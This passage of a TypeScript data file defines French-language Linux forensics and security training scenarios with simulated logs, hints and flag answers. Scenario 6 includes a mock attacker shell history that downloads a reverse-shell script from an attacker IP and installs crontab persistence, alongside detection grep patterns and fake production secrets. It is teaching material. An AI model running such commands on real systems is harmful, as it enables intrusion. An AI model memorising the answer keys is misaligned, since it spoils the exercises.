export interface ScenarioFlag {
  id: string;
  question: string;
  outputContains?: string;
  outputPattern?: string;
  hint: string;
  /** @deprecated use outputContains/outputPattern instead */
  command?: string;
  /** @deprecated use outputContains/outputPattern instead */
  answer?: string;
}

export interface ScenarioStep {
  id: number;
  title: string;
  context: string;
  objective: string;
  hints: string[];
  flags?: ScenarioFlag[];
  fileSystem?: Record<string, unknown>;
  /** @deprecated replaced by flags */
  validation?: { type: 'command' | 'output'; value: string; description: string }[];
}

export interface Scenario {
  id: number;
  title: string;
  category: 'forensic' | 'reseau' | 'systeme' | 'hacking' | 'pentest';
  tier?: 'easy' | 'medium' | 'advanced' | 'extreme';
  /** @deprecated use tier instead */
  difficulty?: 'intermediate' | 'advanced';
  duration: string;
  description: string;
  context: string;
  xpReward: number;
  badge?: string;
  prerequisites?: {
    completedLevels: number[];
    description: string;
  };
  medals?: { gold: number; silver: number; bronze: number };
  labType?: 'simulated' | 'docker';
  labContainer?: string;
  labTargets?: { name: string; ip: string; description: string }[];
  steps: ScenarioStep[];
}

export const getScenarioCategoryLabel = (category: Scenario['category']): string => {
  switch (category) {
    case 'forensic': return 'Forensic Linux';
    case 'reseau': return 'Réseau';
    case 'systeme': return 'Système';
    case 'hacking': return 'Hacking';
    case 'pentest': return 'Pentest';
    default: return 'Général';
  }
};

export const getScenarioCategoryColor = (category: Scenario['category']): string => {
  switch (category) {
    case 'forensic': return 'bg-blue-500/20 text-blue-300 border-blue-500/30';
    case 'reseau': return 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30';
    case 'systeme': return 'bg-purple-500/20 text-purple-300 border-purple-500/30';
    case 'hacking': return 'bg-red-500/20 text-red-300 border-red-500/30';
    case 'pentest': return 'bg-orange-500/20 text-orange-300 border-orange-500/30';
    default: return 'bg-gray-500/20 text-gray-300 border-gray-500/30';
  }
};

export const getScenarioCategoryIcon = (category: Scenario['category']): string => {
  switch (category) {
    case 'forensic': return '🔍';
    case 'reseau': return '🌐';
    case 'systeme': return '⚙️';
    case 'hacking': return '💀';
    case 'pentest': return '🎯';
    default: return '📋';
  }
};

export const scenarios: Scenario[] = [

  // ══════════════════════════════════════════════════════════════════
  // EASY — IDs 1-5 — labType: simulated
  // Prérequis : niveaux 1-20 (bases Linux)
  // ══════════════════════════════════════════════════════════════════

  {
    id: 1,
    title: "Le fichier disparu",
    category: "forensic",
    tier: "easy",
    duration: "10-15 min",
    description: "Un fichier de configuration critique a disparu. Retrouve-le, identifie qui l'a supprimé et récupère son contenu depuis les logs.",
    context: `📋 BRIEFING — Ticket #4421

Ton collègue dev te contacte en panique :
"Le fichier config.json a disparu ! L'appli est en prod !"

Ton rôle : trouver ce qui s'est passé, récupérer les données et identifier le responsable.`,
    xpReward: 200,
    badge: "file_detective",
    labType: "simulated",
    prerequisites: {
      completedLevels: [1, 2, 3, 4, 5],
      description: "Maîtrise des commandes de base (ls, cat, grep, find)",
    },
    medals: { gold: 300, silver: 600, bronze: 900 },
    steps: [
      {
        id: 1,
        title: "Chercher les traces du fichier",
        context: "Le fichier config.json devrait être dans /app/config/. Il a disparu mais peut-être que des logs en gardent une trace.",
        objective: "Trouver la dernière modification connue du fichier disparu",
        hints: [
          "`ls -la /app/config/` pour lister tout le répertoire (fichiers cachés inclus).",
          "`find /app -name '*.json' 2>/dev/null` pour chercher dans tout /app.",
          "Regarde le fichier `.bash_history` — les suppressions y apparaissent.",
        ],
        flags: [
          {
            id: "who_deleted",
            question: "Quel utilisateur a supprimé le fichier ? (cherche dans bash_history)",
            outputContains: "rm config.json",
            hint: "Lis le fichier .bash_history avec `cat .bash_history`",
          },
        ],
        fileSystem: {
          "app": {
            "config": {
              ".bash_history": "ls -la\ncd /app/config\ncat config.json\nrm config.json\nexit",
              ".gitkeep": "",
            },
            "logs": {
              "app.log": `[2024-01-15 09:00:01] INFO  Config loaded: {"db_host":"localhost","db_port":5432,"app_key":"s3cr3t_k3y_2024"}
[2024-01-15 09:00:02] INFO  Server started on port 3000
[2024-01-15 09:15:44] WARN  Config file modified
[2024-01-15 09:16:01] ERROR Config file not found — using defaults`,
            },
          },
        },
      },
      {
        id: 2,
        title: "Récupérer le contenu depuis les logs",
        context: "Le fichier est supprimé mais l'application l'avait chargé au démarrage. Les logs applicatifs en ont gardé une trace.",
        objective: "Extraire la valeur de app_key depuis les logs",
        hints: [
          "`cat /app/logs/app.log` pour lire les logs complets.",
          "`grep 'Config loaded' /app/logs/app.log` pour isoler la ligne de chargement.",
          "La clé applicative est dans le JSON logué au démarrage.",
        ],
        flags: [
          {
            id: "app_key",
            question: "Quelle est la valeur de app_key dans les logs ?",
            outputContains: "s3cr3t_k3y_2024",
            hint: "Cherche la ligne 'Config loaded' dans app.log",
          },
        ],
        fileSystem: {
          "app": {
            "logs": {
              "app.log": `[2024-01-15 09:00:01] INFO  Config loaded: {"db_host":"localhost","db_port":5432,"app_key":"s3cr3t_k3y_2024"}
[2024-01-15 09:00:02] INFO  Server started on port 3000
[2024-01-15 09:15:44] WARN  Config file modified
[2024-01-15 09:16:01] ERROR Config file not found — using defaults`,
            },
          },
        },
      },
      {
        id: 3,
        title: "Reconstituer et sécuriser",
        context: "Tu as toutes les infos. Recrée le fichier config.json et sécurise-le en restreignant ses permissions.",
        objective: "Recréer config.json avec chmod 600",
        hints: [
          "`echo '{\"db_host\":\"localhost\",\"app_key\":\"s3cr3t_k3y_2024\"}' > /app/config/config.json`",
          "`chmod 600 /app/config/config.json` — lecture/écriture pour le propriétaire uniquement.",
          "`ls -la /app/config/config.json` pour vérifier les permissions.",
        ],
        flags: [
          {
            id: "permissions",
            question: "Quelles sont les permissions du fichier recréé ? (ls -la)",
            outputPattern: "-rw-------",
            hint: "Crée le fichier puis applique `chmod 600`, enfin `ls -la` pour vérifier",
          },
        ],
        fileSystem: {
          "app": {
            "config": {},
          },
        },
      },
    ],
  },

  {
    id: 2,
    title: "SOS Disque Plein",
    category: "systeme",
    tier: "easy",
    duration: "10-15 min",
    description: "Le serveur affiche 'No space left on device'. Identifie les fichiers responsables et libère de l'espace.",
    context: `📋 ALERTE SYSTÈME — /var est plein à 100%

L'application ne peut plus écrire de logs. Des erreurs tombent en prod.
Trouve les coupables, libère de l'espace, explique pourquoi c'est arrivé.`,
    xpReward: 200,
    labType: "simulated",
    prerequisites: {
      completedLevels: [1, 2, 3, 4, 5, 6, 7],
      description: "Commandes de base + gestion de l'espace disque (du, df)",
    },
    medals: { gold: 250, silver: 500, bronze: 750 },
    steps: [
      {
        id: 1,
        title: "Diagnostiquer l'espace disque",
        context: "Avant d'agir, comprends la situation. Quels répertoires consomment le plus ?",
        objective: "Identifier le répertoire le plus gourmand sous /var",
        hints: [
          "`df -h` — affiche l'utilisation de chaque partition.",
          "`du -sh /var/*` — taille de chaque sous-répertoire de /var.",
          "`du -sh /var/* | sort -rh | head -5` — les 5 plus gros.",
        ],
        flags: [
          {
            id: "biggest_dir",
            question: "Quel sous-répertoire de /var est le plus volumineux ?",
            outputContains: "/var/log",
            hint: "Lance `du -sh /var/* | sort -rh | head -5`",
          },
        ],
        fileSystem: {
          "var": {
            "log": {
              "app.log": "A".repeat(5000) + "\n[ERROR] disk full\n",
              "debug.log": "B".repeat(8000),
              "old_backup.tar.gz": "C".repeat(20000),
            },
            "tmp": {
              "session_abc": "tmp data",
            },
            "cache": {
              "apt": {
                "archives": "D".repeat(3000),
              },
            },
          },
        },
      },
      {
        id: 2,
        title: "Identifier les gros fichiers",
        context: "Un ou plusieurs fichiers spécifiques occupent tout l'espace. Trouve-les.",
        objective: "Trouver les fichiers de plus de 1 Mo sous /var",
        hints: [
          "`find /var -size +1M -type f` — fichiers de plus de 1 Mo.",
          "`find /var -size +1M -type f -exec ls -lh {} \\;` — avec leur taille.",
          "Note le nom du plus gros fichier.",
        ],
        flags: [
          {
            id: "big_file",
            question: "Quel fichier dépasse 1 Mo dans /var ?",
            outputContains: "old_backup.tar.gz",
            hint: "Utilise `find /var -size +1M -type f`",
          },
        ],
        fileSystem: {
          "var": {
            "log": {
              "app.log": "A".repeat(5000) + "\n[ERROR] disk full\n",
              "debug.log": "B".repeat(8000),
              "old_backup.tar.gz": "C".repeat(20000),
            },
          },
        },
      },
      {
        id: 3,
        title: "Nettoyer et prévenir",
        context: "Supprime les fichiers inutiles et mets en place une rotation des logs.",
        objective: "Supprimer le fichier volumineux et vérifier l'espace libéré",
        hints: [
          "`rm /var/log/old_backup.tar.gz`",
          "`df -h` après suppression pour confirmer l'espace libéré.",
          "Pour la rotation : `logrotate` est l'outil standard sous Linux.",
        ],
        flags: [
          {
            id: "space_freed",
            question: "Combien d'espace est disponible après nettoyage ? (df -h /var)",
            outputPattern: "\\d+[KMG]\\s+\\d+[KMG]\\s+\\d+[KMG]",
            hint: "Supprime le fichier puis lance `df -h`",
          },
        ],
        fileSystem: {
          "var": {
            "log": {
              "app.log": "[INFO] Server running\n",
              "old_backup.tar.gz": "C".repeat(20000),
            },
          },
        },
      },
    ],
  },

  {
    id: 3,
    title: "Connexions suspectes",
    category: "reseau",
    tier: "easy",
    duration: "15-20 min",
    description: "Une machine sur ton réseau établit des connexions vers des IPs inconnues. Analyse les logs réseau et détermine si c'est une compromission.",
    context: `📋 ALERTE IDS — Trafic anormal détecté

Le pare-feu a bloqué puis loggé des connexions sortantes inhabituelles.
Certaines arrivent de nuit, vers des ports non-standards. C'est ton tour de jouer.`,
    xpReward: 250,
    labType: "simulated",
    prerequisites: {
      completedLevels: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
      description: "Bases Linux + notions de réseau (SSH niveau 10)",
    },
    medals: { gold: 300, silver: 600, bronze: 900 },
    steps: [
      {
        id: 1,
        title: "Analyser les connexions actives",
        context: "Commence par regarder les connexions réseau actives au moment de l'alerte.",
        objective: "Identifier les connexions ESTABLISHED vers des IPs externes",
        hints: [
          "`cat netstat.log` — snapshot des connexions au moment de l'alerte.",
          "`grep ESTABLISHED netstat.log` — uniquement les connexions actives.",
          "Les IPs privées (192.168.x.x, 10.x.x.x) sont internes. Les autres sont suspectes.",
        ],
        flags: [
          {
            id: "suspicious_ip",
            question: "Quelle IP externe non-standard apparaît dans les connexions ESTABLISHED ?",
            outputContains: "185.234.219.10",
            hint: "Filtre avec `grep ESTABLISHED netstat.log` et cherche les IPs hors 192.168.x.x",
          },
        ],
        fileSystem: {
          "netstat.log": `Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 192.168.1.50:22         192.168.1.1:52341       ESTABLISHED
tcp        0      0 192.168.1.50:443        185.234.219.10:8443     ESTABLISHED
tcp        0      0 192.168.1.50:80         10.0.0.5:33221          ESTABLISHED
tcp        0      0 192.168.1.50:4444       185.234.219.10:443      ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN`,
          "firewall.log": `2024-01-20 02:14:33 ALLOW TCP 192.168.1.50:4444 -> 185.234.219.10:443
2024-01-20 02:14:34 ALLOW TCP 192.168.1.50:4444 -> 185.234.219.10:443
2024-01-20 03:22:10 ALLOW TCP 192.168.1.50:443 -> 185.234.219.10:8443
2024-01-20 03:22:11 BLOCK UDP 192.168.1.50:5555 -> 185.234.219.10:53`,
        },
      },
      {
        id: 2,
        title: "Retrouver le processus responsable",
        context: "Une connexion ouverte est associée à un processus. Identifie le programme qui maintient cette connexion suspecte.",
        objective: "Trouver quel processus utilise le port 4444",
        hints: [
          "`cat processes.log` — liste des processus avec leurs connexions.",
          "`grep 4444 processes.log` — quel PID utilise ce port.",
          "Un port 4444 est classiquement utilisé par Metasploit (reverse shell).",
        ],
        flags: [
          {
            id: "malicious_process",
            question: "Quel est le nom du processus utilisant le port 4444 ?",
            outputContains: "bash",
            hint: "Grep '4444' dans processes.log",
          },
        ],
        fileSystem: {
          "processes.log": `PID   USER     COMMAND                 PORT    REMOTE
1234  root     /usr/sbin/sshd          22      192.168.1.1
2345  www-data /usr/sbin/apache2       80      10.0.0.5
3456  root     bash                    4444    185.234.219.10:443
4567  root     /usr/bin/python3 -c...  -       -`,
          "crontab.log": `# crontab -l output for root
*/5 * * * * /tmp/.update >/dev/null 2>&1
@reboot /tmp/.update &`,
        },
      },
      {
        id: 3,
        title: "Identifier le vecteur d'intrusion",
        context: "Il faut savoir comment l'attaquant est entré. La crontab et l'historique donnent des indices.",
        objective: "Trouver le fichier malveillant planté par l'attaquant",
        hints: [
          "`cat crontab.log` — la crontab root cache quelque chose.",
          "`find /tmp -type f` — les attaquants utilisent souvent /tmp.",
          "Le fichier `/.update` est un binaire planté pour persister après reboot.",
        ],
        flags: [
          {
            id: "malware_path",
            question: "Quel chemin complet contient le malware de persistance ?",
            outputContains: "/tmp/.update",
            hint: "Lis la crontab.log — le chemin y est en clair",
          },
        ],
        fileSystem: {
          "crontab.log": `# crontab -l output for root
*/5 * * * * /tmp/.update >/dev/null 2>&1
@reboot /tmp/.update &`,
          "tmp": {
            ".update": "(binary malware placeholder)",
            "sess_abc123": "PHP session data",
          },
        },
      },
    ],
  },

  {
    id: 4,
    title: "Le script brisé",
    category: "systeme",
    tier: "easy",
    duration: "10-15 min",
    description: "Un script de sauvegarde automatique plante silencieusement depuis 3 jours. Les données ne sont plus sauvegardées. Trouve et corrige le bug.",
    context: `📋 URGENCE — Sauvegarde en échec silencieux

La sauvegarde nocturne échoue sans alerte depuis 3 jours.
Le script existe, il tourne, mais les fichiers de backup sont vides ou absents.
Diagnostique et répare.`,
    xpReward: 200,
    labType: "simulated",
    prerequisites: {
      completedLevels: [1, 2, 3, 4, 5, 6, 7, 8],
      description: "Bases Linux + lecture de scripts bash",
    },
    medals: { gold: 200, silver: 400, bronze: 700 },
    steps: [
      {
        id: 1,
        title: "Lire et comprendre le script",
        context: "Commence par lire le script de sauvegarde pour comprendre ce qu'il est censé faire.",
        objective: "Identifier la ligne problématique dans backup.sh",
        hints: [
          "`cat backup.sh` — lis le script en entier.",
          "Cherche les chemins : le répertoire source existe-t-il ?",
          "`bash -n backup.sh` — vérifie la syntaxe sans exécuter.",
        ],
        flags: [
          {
            id: "wrong_path",
            question: "Quel chemin incorrect est utilisé dans le script ? (le répertoire source)",
            outputContains: "/opt/data_backup",
            hint: "Lis backup.sh et cherche le chemin source — est-il correct ?",
          },
        ],
        fileSystem: {
          "backup.sh": `#!/bin/bash
# Script de sauvegarde — version 2.1
# Auteur: admin@corp.local

SOURCE=/opt/data_backup   # BUG: should be /opt/data
DEST=/var/backups
DATE=$(date +%Y%m%d)
LOGFILE=/var/log/backup.log

echo "[$DATE] Starting backup..." >> $LOGFILE

if [ ! -d "$SOURCE" ]; then
    echo "[$DATE] ERROR: Source directory not found: $SOURCE" >> $LOGFILE
    exit 1
fi

tar -czf "$DEST/backup_$DATE.tar.gz" "$SOURCE" >> $LOGFILE 2>&1
echo "[$DATE] Backup complete." >> $LOGFILE`,
          "var": {
            "log": {
              "backup.log": `[20240112] Starting backup...
[20240112] ERROR: Source directory not found: /opt/data_backup
[20240113] Starting backup...
[20240113] ERROR: Source directory not found: /opt/data_backup
[20240114] Starting backup...
[20240114] ERROR: Source directory not found: /opt/data_backup`,
            },
          },
          "opt": {
            "data": {
              "db.sql": "-- Database dump 2024-01-11\nINSERT INTO users VALUES (1,'admin','hash');\n",
              "config.json": '{"version":"2.1","env":"prod"}',
            },
          },
        },
      },
      {
        id: 2,
        title: "Vérifier les logs d'erreur",
        context: "Les logs confirment le problème. Depuis combien de temps la sauvegarde échoue-t-elle ?",
        objective: "Compter le nombre de jours consécutifs d'échec",
        hints: [
          "`cat /var/log/backup.log` — lis tous les logs.",
          "`grep ERROR /var/log/backup.log | wc -l` — compte les erreurs.",
          "Chaque erreur correspond à un jour d'échec.",
        ],
        flags: [
          {
            id: "days_failed",
            question: "Combien d'erreurs consécutives apparaissent dans backup.log ?",
            outputContains: "3",
            hint: "Lance `grep ERROR /var/log/backup.log | wc -l`",
          },
        ],
        fileSystem: {
          "var": {
            "log": {
              "backup.log": `[20240112] Starting backup...
[20240112] ERROR: Source directory not found: /opt/data_backup
[20240113] Starting backup...
[20240113] ERROR: Source directory not found: /opt/data_backup
[20240114] Starting backup...
[20240114] ERROR: Source directory not found: /opt/data_backup`,
            },
          },
        },
      },
      {
        id: 3,
        title: "Corriger et tester",
        context: "Tu as identifié le bug. Corrige le chemin dans le script et lance une sauvegarde manuelle pour vérifier.",
        objective: "Corriger SOURCE dans backup.sh et lancer le script",
        hints: [
          "`sed -i 's|/opt/data_backup|/opt/data|' backup.sh` — correction en une ligne.",
          "Puis `bash backup.sh` pour tester.",
          "`ls /var/backups/` — le fichier tar.gz doit apparaître.",
        ],
        flags: [
          {
            id: "backup_created",
            question: "Quel message confirme la réussite de la sauvegarde dans backup.log ?",
            outputContains: "Backup complete",
            hint: "Corrige backup.sh, exécute-le, puis `cat /var/log/backup.log`",
          },
        ],
        fileSystem: {
          "backup.sh": `#!/bin/bash
SOURCE=/opt/data_backup
DEST=/var/backups
DATE=$(date +%Y%m%d)
LOGFILE=/var/log/backup.log
echo "[$DATE] Starting backup..." >> $LOGFILE
if [ ! -d "$SOURCE" ]; then
    echo "[$DATE] ERROR: Source directory not found: $SOURCE" >> $LOGFILE
    exit 1
fi
tar -czf "$DEST/backup_$DATE.tar.gz" "$SOURCE" >> $LOGFILE 2>&1
echo "[$DATE] Backup complete." >> $LOGFILE`,
          "opt": {
            "data": {
              "db.sql": "INSERT INTO users VALUES (1,'admin','hash');",
            },
          },
          "var": {
            "backups": {},
            "log": { "backup.log": "[20240114] ERROR: Source directory not found: /opt/data_backup\n" },
          },
        },
      },
    ],
  },

  {
    id: 5,
    title: "Messages dans l'obscurité",
    category: "forensic",
    tier: "easy",
    duration: "15-20 min",
    description: "Un employé suspecté d'exfiltration de données dissimule des messages dans des fichiers en apparence normaux. Trouve les données cachées.",
    context: `📋 INVESTIGATION INTERNE — Fuite potentielle

Le service sécurité a détecté des transferts de fichiers inhabituels.
Les fichiers envoyés semblent anodins mais quelque chose est planqué dedans.
Trouve ce qui est caché et comment.`,
    xpReward: 250,
    labType: "simulated",
    prerequisites: {
      completedLevels: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],
      description: "Bases Linux + manipulation de fichiers texte",
    },
    medals: { gold: 400, silver: 700, bronze: 1000 },
    steps: [
      {
        id: 1,
        title: "Analyser les fichiers suspects",
        context: "Plusieurs fichiers ont été interceptés. Inspecte leur contenu réel au-delà de l'apparence.",
        objective: "Détecter un encodage ou un contenu anormal dans les fichiers",
        hints: [
          "`file rapport.txt` — le type réel du fichier.",
          "`xxd rapport.txt | head` — vue hexadécimale des premiers octets.",
          "`cat -A rapport.txt` — affiche les caractères spéciaux cachés.",
        ],
        flags: [
          {
            id: "base64_found",
            question: "Quel type d'encodage est utilisé pour cacher le message ? (cherche dans notes.txt)",
            outputContains: "base64",
            hint: "Lis notes.txt — il mentionne explicitement la méthode d'encodage",
          },
        ],
        fileSystem: {
          "rapport.txt": `RAPPORT MENSUEL — Janvier 2024

Performance de l'équipe : satisfaisante.
Projets en cours : migration cloud, refonte UI.
Prochaine réunion : 15 février.

Note interne : RAS.`,
          "notes.txt": `Mémo perso - ne pas partager

Méthode de communication sécurisée :
- encoder les messages en base64
- les cacher dans les fichiers de rapport
- exemple: echo "message" | base64`,
          "planning.txt": `Lundi: réunion
Mardi: dev
Mercredi: code review
Jeudi: aW50ZXJuYWxfZGF0YTpzZWNyZXRfa2V5XzIwMjQ=
Vendredi: démo`,
        },
      },
      {
        id: 2,
        title: "Décoder le message caché",
        context: "Un fichier contient une ligne encodée en base64 au milieu de texte normal. Décode-la.",
        objective: "Décoder la chaîne base64 trouvée dans planning.txt",
        hints: [
          "`grep -E '[A-Za-z0-9+/]{20,}=' planning.txt` — trouve les chaînes base64.",
          "`echo 'aW50ZXJuYWxfZGF0YTpzZWNyZXRfa2V5XzIwMjQ=' | base64 -d` — décode.",
          "Le résultat révèle des données internes.",
        ],
        flags: [
          {
            id: "decoded_message",
            question: "Que contient le message décodé ? (format data:valeur)",
            outputContains: "internal_data:secret_key_2024",
            hint: "Décode la chaîne base64 du jeudi dans planning.txt",
          },
        ],
        fileSystem: {
          "planning.txt": `Lundi: réunion
Mardi: dev
Mercredi: code review
Jeudi: aW50ZXJuYWxfZGF0YTpzZWNyZXRfa2V5XzIwMjQ=
Vendredi: démo`,
        },
      },
      {
        id: 3,
        title: "Reconstituer la timeline",
        context: "Maintenant que tu sais comment les données sont exfiltrées, trouve les autres fichiers modifiés récemment.",
        objective: "Lister tous les fichiers modifiés dans les 7 derniers jours",
        hints: [
          "`find . -mtime -7 -type f` — fichiers modifiés dans les 7 jours.",
          "`find . -mtime -7 -type f -exec ls -la {} \\;` — avec détails.",
          "Note les fichiers suspects avec des tailles inhabituelles.",
        ],
        flags: [
          {
            id: "all_modified",
            question: "Combien de fichiers ont été modifiés récemment ? (find . -mtime -7 -type f | wc -l)",
            outputPattern: "[0-9]+",
            hint: "Lance `find . -mtime -7 -type f | wc -l`",
          },
        ],
        fileSystem: {
          "rapport.txt": "RAPPORT MENSUEL — Janvier 2024\n",
          "notes.txt": "Mémo perso\n",
          "planning.txt": "Jeudi: aW50ZXJuYWxfZGF0YTpzZWNyZXRfa2V5XzIwMjQ=\n",
          "archive": {
            "rapport_dec.txt": "Rapport décembre.",
            "old_notes.txt": "Ancient notes.",
          },
        },
      },
    ],
  },

  // ══════════════════════════════════════════════════════════════════
  // MEDIUM — IDs 6-10 — labType: simulated
  // Prérequis : niveaux 1-60 (bases + réseau + scripting)
  // ══════════════════════════════════════════════════════════════════

  {
    id: 6,
    title: "Intrusion SSH nocturne",
    category: "forensic",
    tier: "medium",
    duration: "20-30 min",
    description: "Une intrusion SSH a eu lieu à 3h du matin. Reconstitue la séquence complète : comment l'attaquant est entré, ce qu'il a fait, et ce qu'il a laissé.",
    context: `📋 SOC ALERT #2024-0892 — Intrusion confirmée

Niveau de menace : ÉLEVÉ
Heure de détection : 03:47 UTC
Machine cible : web-prod-01 (192.168.10.20)

L'IDS a détecté une session SSH anormalement longue de nuit.
L'utilisateur 'deploy' n'était pas censé travailler à cette heure.
Mène l'investigation complète.`,
    xpReward: 400,
    badge: "ssh_analyst",
    labType: "simulated",
    prerequisites: {
      completedLevels: [10, 20, 30, 40, 50, 60],
      description: "SSH, gestion système, scripting, forensic de base",
    },
    medals: { gold: 600, silver: 1200, bronze: 1800 },
    steps: [
      {
        id: 1,
        title: "Analyse des logs d'authentification",
        context: "auth.log contient toutes les tentatives SSH. Identifie l'IP attaquante et la méthode utilisée.",
        objective: "Trouver l'IP source de l'intrusion et le compte compromis",
        hints: [
          "`grep 'Accepted' auth.log` — connexions réussies uniquement.",
          "`grep -v '192.168.' auth.log | grep Accepted` — exclus les IPs internes.",
          "Note l'heure exacte, l'IP source et le compte utilisé.",
        ],
        flags: [
          {
            id: "attacker_ip",
            question: "Quelle est l'IP de l'attaquant (connexion Accepted de nuit) ?",
            outputContains: "203.0.113.99",
            hint: "grep 'Accepted' auth.log et cherche la connexion nocturne",
          },
          {
            id: "compromised_account",
            question: "Quel compte a été utilisé pour l'intrusion ?",
            outputContains: "deploy",
            hint: "La ligne 'Accepted' indique le nom d'utilisateur",
          },
        ],
        fileSystem: {
          "auth.log": `Jan 20 02:55:01 web-prod sshd[3210]: Failed password for deploy from 203.0.113.99 port 54321 ssh2
Jan 20 02:55:02 web-prod sshd[3210]: Failed password for deploy from 203.0.113.99 port 54322 ssh2
Jan 20 02:55:03 web-prod sshd[3210]: Failed password for deploy from 203.0.113.99 port 54323 ssh2
Jan 20 02:55:14 web-prod sshd[3210]: Failed password for deploy from 203.0.113.99 port 54330 ssh2
Jan 20 02:55:31 web-prod sshd[3211]: Accepted password for deploy from 203.0.113.99 port 54401 ssh2
Jan 20 02:55:31 web-prod sshd[3211]: pam_unix(sshd:session): session opened for user deploy
Jan 20 08:00:01 web-prod sshd[4000]: Accepted publickey for admin from 192.168.1.5 port 22001 ssh2`,
        },
      },
      {
        id: 2,
        title: "Reconstituer les actions post-intrusion",
        context: "L'attaquant s'est connecté. Que s'est-il passé ensuite ? L'historique bash révèle tout.",
        objective: "Lister les commandes exécutées par l'attaquant après connexion",
        hints: [
          "`cat deploy_bash_history` — historique des commandes du compte deploy.",
          "Cherche : wget/curl (téléchargements), chmod +x (exécution), crontab (persistance).",
          "`grep -E '(wget|curl|chmod|crontab|nc|bash -i)' deploy_bash_history`",
        ],
        flags: [
          {
            id: "downloaded_file",
            question: "Quel fichier l'attaquant a-t-il téléchargé ?",
            outputContains: "revshell.sh",
            hint: "Cherche wget ou curl dans deploy_bash_history",
          },
          {
            id: "persistence_method",
            question: "Quelle méthode de persistance a été installée ?",
            outputContains: "crontab",
            hint: "L'attaquant a utilisé crontab — cherche cette commande dans l'historique",
          },
        ],
        fileSystem: {
          "deploy_bash_history": `id
whoami
uname -a
cat /etc/passwd
find / -perm -u=s -type f 2>/dev/null
wget http://203.0.113.99:8080/revshell.sh -O /tmp/.revshell.sh
chmod +x /tmp/.revshell.sh
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.revshell.sh") | crontab -
cat /var/www/html/config.php
cat /home/deploy/.ssh/authorized_keys
exit`,
        },
      },
      {
        id: 3,
        title: "Évaluer les dommages",
        context: "L'attaquant a lu des fichiers de configuration. Quelles données ont été exposées ?",
        objective: "Identifier les données sensibles accédées par l'attaquant",
        hints: [
          "`cat config.php` — contenu du fichier lu par l'attaquant.",
          "Cherche : mots de passe, clés API, connexions base de données.",
          "`grep -E '(password|key|secret|token|DB_)' config.php`",
        ],
        flags: [
          {
            id: "exposed_password",
            question: "Quel mot de passe de base de données a été exposé ?",
            outputContains: "Pr0d_DB_P@ss!",
            hint: "Lis config.php et cherche DB_PASSWORD ou similaire",
          },
        ],
        fileSystem: {
          "config.php": `<?php
// Production configuration
define('DB_HOST', 'db-prod-01.internal');
define('DB_NAME', 'webapp_prod');
define('DB_USER', 'webapp_user');
define('DB_PASSWORD', 'Pr0d_DB_P@ss!');
define('APP_KEY', 'base64:xK9mN2pQ4rS6tU8vW0yZ1aB3cD5eF7gH');
define('MAIL_PASSWORD', 'smtp_secret_789');
define('STRIPE_SECRET', 'sk_live_4xT8mK2pN6qR0sU');
?>`,
        },
      },
    ],
  },

  {
    id: 7,
    title: "Reconnaissance web complète",
    category: "reseau",
    tier: "medium",
    duration: "25-35 min",
    description: "Effectue une reconnaissance complète d'une application web : énumération des répertoires, identification des technologies, recherche de fichiers sensibles exposés.",
    context: `📋 MISSION — Bug Bounty recon phase

Programme : BugCrowd — target.example.com (simulé)
Scope : Énumération passive et active, pas d'exploitation
Objectif : Cartographier la surface d'attaque avant de rapporter

Commence la phase de reconnaissance.`,
    xpReward: 400,
    labType: "simulated",
    prerequisites: {
      completedLevels: [10, 20, 40, 60, 70],
      description: "Réseau, HTTP, outils de recon web",
    },
    medals: { gold: 600, silver: 1100, bronze: 1600 },
    steps: [
      {
        id: 1,
        title: "Identifier les technologies utilisées",
        context: "Les en-têtes HTTP révèlent souvent le stack technologique d'un serveur.",
        objective: "Extraire les informations de version depuis les headers HTTP",
        hints: [
          "`curl -I http://target.local` — affiche les headers de réponse.",
          "Cherche : Server, X-Powered-By, X-Generator.",
          "`curl -sv http://target.local 2>&1 | grep -E '(Server|X-Powered|X-Generator)'`",
        ],
        flags: [
          {
            id: "server_tech",
            question: "Quelle technologie est révélée par le header Server ?",
            outputContains: "Apache/2.4.51",
            hint: "Lis les headers dans http_response.txt ou lance curl -I",
          },
          {
            id: "cms_version",
            question: "Quel CMS et quelle version est utilisé (header X-Generator) ?",
            outputContains: "WordPress 6.2",
            hint: "Cherche le header X-Generator dans la réponse HTTP",
          },
        ],
        fileSystem: {
          "http_response.txt": `HTTP/1.1 200 OK
Date: Mon, 20 Jan 2024 10:00:00 GMT
Server: Apache/2.4.51 (Ubuntu)
X-Powered-By: PHP/8.1.2
X-Generator: WordPress 6.2
Content-Type: text/html; charset=UTF-8
Content-Length: 45231
Set-Cookie: PHPSESSID=abc123; path=/; HttpOnly
X-Frame-Options: SAMEORIGIN`,
        },
      },
      {
        id: 2,
        title: "Énumération des répertoires",
        context: "Un fichier de résultats gobuster a été récupéré. Identifie les répertoires et fichiers intéressants.",
        objective: "Trouver les chemins sensibles exposés",
        hints: [
          "`cat gobuster_results.txt` — résultats de l'énumération.",
          "Cherche : /admin, /backup, /.env, /config, /wp-admin.",
          "`grep -E '(admin|backup|\\.env|config|wp-)' gobuster_results.txt`",
        ],
        flags: [
          {
            id: "admin_path",
            question: "Quel chemin d'administration a été trouvé ?",
            outputContains: "/wp-admin",
            hint: "Cherche 'admin' dans gobuster_results.txt",
          },
          {
            id: "sensitive_file",
            question: "Quel fichier sensible est exposé à la racine ?",
            outputContains: "/.env",
            hint: "Les fichiers .env contiennent des secrets — cherche dans les résultats",
          },
        ],
        fileSystem: {
          "gobuster_results.txt": `/index.php              (Status: 200) [Size: 45231]
/images/               (Status: 301) [Size: 0]
/wp-content/           (Status: 301) [Size: 0]
/wp-admin/             (Status: 301) [Size: 0]
/wp-includes/          (Status: 301) [Size: 0]
/.env                  (Status: 200) [Size: 312]
/backup/               (Status: 403) [Size: 289]
/config/               (Status: 403) [Size: 289]
/phpinfo.php           (Status: 200) [Size: 75821]
/server-status         (Status: 403) [Size: 289]
/xmlrpc.php            (Status: 405) [Size: 42]`,
        },
      },
      {
        id: 3,
        title: "Extraire les secrets exposés",
        context: "Le fichier .env est accessible publiquement. C'est une fuite de données critique.",
        objective: "Lire le contenu du .env et identifier les secrets",
        hints: [
          "`cat env_file.txt` — contenu du .env récupéré.",
          "Cherche : API keys, database credentials, tokens.",
